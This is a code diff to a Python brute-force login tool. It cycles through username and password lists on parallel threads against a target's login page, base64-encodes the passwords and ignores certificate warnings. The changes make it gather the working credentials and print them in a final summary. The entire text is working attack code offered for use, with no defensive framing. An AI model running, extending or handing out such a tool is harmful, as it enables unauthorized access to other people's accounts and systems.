@@ -3,7 +3,7 @@ import base64
 import os
 import sys
 import threading
-from concurrent.futures import ThreadPoolExecutor
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.parse import quote
 from typing import List
 
@@ -11,6 +11,7 @@ requests.packages.urllib3.disable_warnings()
 
 progress_lock = threading.Lock()
 progress_counter = 0
+success_credentials = []
 total_combinations = 0
 custom_proxy = None
 
@@ -40,7 +41,7 @@ def test_connection(target: str):
         sys.exit(1)
 
 def attempt_login(target: str, username: str, password: str, executor):
-    global progress_counter
+    global progress_counter, success_credentials
 
     encoded_password = base64.b64encode(password.encode()).decode()
     url_encoded_password = quote(encoded_password, safe='')
@@ -62,8 +63,9 @@ def attempt_login(target: str, username: str, password: str, executor):
             progress_counter += 1
             print(f"[{progress_counter}/{total_combinations}]", end='\r')
         if response.status_code == 200 and "Invalid Login Credentials" not in response.text:
-            print(f"\n[+] SUCCESS: {username}:{password} -> {url_encoded_password}")
-            print(response.text)
+            with progress_lock:
+                success_credentials.append((username, password))
+                print(f"\n[+] SUCCESS: {username}:{password}")
     except requests.exceptions.Timeout:
         print(f"\n[!] Timeout: {username}:{password} — retrying (consider lowering -w)")
         executor.submit(attempt_login, target, username, password, executor)
@@ -85,11 +87,24 @@ def send_request(target: str, u: str, p: str, w: int):
     passwords = read_file_lines(p) if is_file(p) else [p]
     total_combinations = len(usernames) * len(passwords)
 
+    futures = []
     with ThreadPoolExecutor(max_workers=w) as executor:
         for username in usernames:
             for password in passwords:
-                executor.submit(lambda u=username, p=password: attempt_login(target, u, p, executor))
+                futures.append(executor.submit(attempt_login, target, username, password, executor))
 
+        for future in as_completed(futures):
+            pass
+
+    print("\n\n==== BRUTEFORCE SUMMARY ====")
+    print(f"Total Attempts: {progress_counter}")
+    if success_credentials:
+        print(f"Valid Credentials Found ({len(success_credentials)}):")
+        for cred in success_credentials:
+            print(f" - {cred[0]}:{cred[1]}")
+    else:
+        print("No valid credentials found.")
+    print("=============================")
 
 def parse_args():
     global custom_proxy
